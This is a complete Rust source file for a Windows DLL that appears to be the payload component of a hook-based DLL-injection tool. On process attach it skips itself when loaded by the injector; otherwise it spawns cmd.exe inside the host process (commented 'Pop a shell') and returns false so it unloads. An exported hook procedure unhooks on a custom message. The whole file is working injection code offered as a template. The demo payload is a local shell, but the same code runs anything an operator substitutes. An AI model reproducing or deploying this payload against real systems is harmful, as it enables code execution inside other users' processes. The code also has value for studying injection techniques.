#![no_std]

use windows::{
    Win32::{
        Foundation::{CloseHandle, HMODULE, LPARAM, LRESULT, WPARAM},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Threading::{CREATE_NEW_CONSOLE, CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA},
        },
        UI::WindowsAndMessaging::{CallNextHookEx, MSG, UnhookWindowsHookEx},
    },
    core::{PCSTR, PSTR},
};

const DLL_PROCESS_ATTACH: u32 = 1;

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(_module: HMODULE, reason: u32, _reserved: *mut u8) -> bool {
    if reason != DLL_PROCESS_ATTACH {
        return true;
    }

    // Prevent executing payload when loaded by the injector
    unsafe {
        let Ok(main_module) = GetModuleHandleA(PCSTR::null()) else {
            return false;
        };

        if let Some(is_injector_proc) =
            GetProcAddress(main_module, PCSTR(b"is_injector\0".as_ptr()))
        {
            let result = is_injector_proc();
            if result > 0 {
                return true;
            }
        }
    }

    // Pop a shell
    unsafe {
        let mut si = STARTUPINFOA::default();
        let mut pi = PROCESS_INFORMATION::default();
        si.cb = size_of_val(&si) as _;

        if CreateProcessA(
            PCSTR::null(),
            Some(PSTR(b"cmd.exe\0".as_ptr() as _)),
            None,
            None,
            false,
            CREATE_NEW_CONSOLE,
            None,
            PCSTR::null(),
            &si,
            &mut pi,
        )
        .is_ok()
        {
            _ = CloseHandle(pi.hProcess);
            _ = CloseHandle(pi.hThread);
        }
    }

    // Prevent the module from being loaded, as some applications for some reason never release the module even after unhooking
    false
}

#[unsafe(no_mangle)]
pub extern "system" fn windows_hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    let message = unsafe { &*(lparam.0 as *const MSG) };
    if message.message == 0x511 {
        unsafe {
            _ = UnhookWindowsHookEx(core::mem::transmute(message.lParam));
        }
    }

    unsafe { CallNextHookEx(None, code, wparam, lparam) }
}
